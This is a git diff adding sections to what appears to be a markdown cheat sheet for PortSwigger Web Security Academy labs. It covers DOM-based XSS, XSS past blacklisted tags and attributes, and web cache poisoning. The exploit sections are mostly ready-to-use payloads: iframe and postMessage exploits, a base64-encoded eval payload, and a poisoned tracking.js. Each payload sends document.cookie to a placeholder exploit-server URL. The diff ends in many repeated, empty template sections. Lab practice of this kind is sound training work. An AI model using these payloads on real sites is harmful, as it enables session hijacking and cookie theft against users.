@@ -33,7 +33,7 @@
 | Lots of images and no size parameter | Directory traversal |
 
 
-# DOM Based XSS
+# XSS DOM Based
 ## Detect:
 ```
 GET /
@@ -68,4 +68,124 @@ GET /
 ## Exploit:
 ```
 <iframe src=https://LAB.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"redirect\",\"redirectUrl\":\"javascript:window.location=%22https://EXPLOIT-SERVER-URL-XX.web-securityacademy.net/?c=%22%2bdocument.cookie\"}","*")' >
+```
+# XSS Blacklisted Tags & Attributes
+## Detect:
+```
+GET /?find="><script>alert(1)</script>
+"Tag is not allowed"
+```
+## Exploit:
+```
+GET /?find=<§§> HTTP/1.1
+On https://portswigger.net/web-security/cross-site-scripting/cheat-sheet, click the button "Copy tags to clipboard", and then go back to Burp Intruder, and on the payload tab, click "Paste" to insert the list of HTML tags.
+
+GET /?find=<body+§§=''> HTTP/1.1
+On https://portswigger.net/web-security/cross-site-scripting/cheat-sheet, click the button "Copy events to clipboard", and then go back to Burp Intruder, and on the payload tab, click "Paste" to insert the list of HTML events.
+
+GET https://LAB-URL-XX/?find=<body+onload=alert(1)>
+
+For onpageshow event etc:
+echo "document.location='https://XX-EXPLOIT-SERVER-URL-XX/?x='+document.cookie" | base64
+<iframe src="https://LAB-URL-XX/?searchterm='%3Cbody+onload=eval(atob('XX-BASE64-HERE-XX'))%3E//" onload="this.onload='';this.src+='#1'"></iframe>
+
+For onmessage event:
+<!DOCTYPE html>
+    <body onload="Exploit()">
+        <h2>Exploit</h2>
+        <p>Exploit OnMessage XSS</p>
+        <p>Use target & msg as URL parameters.</p>
+        <iframe id="f" height="0" style="visibility:hidden">
+        </iframe>
+        <script>
+            searchParams = new URLSearchParams(document.location.search);
+            target = searchParams.get('target');
+            msg = searchParams.get('msg');
+            document.getElementById('f').setAttribute('src', target);
+            function Exploit() {frames[0].postMessage(msg,'*')}
+        </script>
+    </body>
+</html>
+<iframe src="https://your-exploit-server-id.exploit-server.net/exploit?target=https://your-lab-id.web-security-academy.net/%3Cbody%20onmessage=document.location=%22https://your-exploit-server-id.exploit-server.net/?c=%22%25%32%62(document.cookie)%3E>">
+```
+# XSS Filter Bypass
+## Detect:
+```
+Search feature parameter such as searchterm, find, etc.
+```
+## Exploit:
+```
+
+```
+# Cache Poisoning
+## Detect:
+```
+GET / HTTP/1.1
+Should see "X-Cache: Miss" on first time, and "X-Cache: Hit" on subsequent hits.
+```
+## Exploit:
+```
+Exploit server, replace the endpoint from "/exploit" to "/resources/js/tracking.js"
+
+Body:
+document.location='https://XX-EXPLOIT-SERVER-URL-XX?x='+document.cookie;
+
+GET / HTTP/1.1
+X-Forwarded-For: XX-DOMAIN-NAME-EXPLOIT-SERVER-XX
+```
+# XSS Blacklisted Tags & Attributes
+## Detect:
+```
+```
+## Exploit:
+```
+```
+# XSS Blacklisted Tags & Attributes
+## Detect:
+```
+```
+## Exploit:
+```
+```
+# XSS Blacklisted Tags & Attributes
+## Detect:
+```
+```
+## Exploit:
+```
+```
+# XSS Blacklisted Tags & Attributes
+## Detect:
+```
+```
+## Exploit:
+```
+```
+# XSS Blacklisted Tags & Attributes
+## Detect:
+```
+```
+## Exploit:
+```
+```
+# XSS Blacklisted Tags & Attributes
+## Detect:
+```
+```
+## Exploit:
+```
+```
+# XSS Blacklisted Tags & Attributes
+## Detect:
+```
+```
+## Exploit:
+```
+```
+# XSS Blacklisted Tags & Attributes
+## Detect:
+```
+```
+## Exploit:
+```
 ```
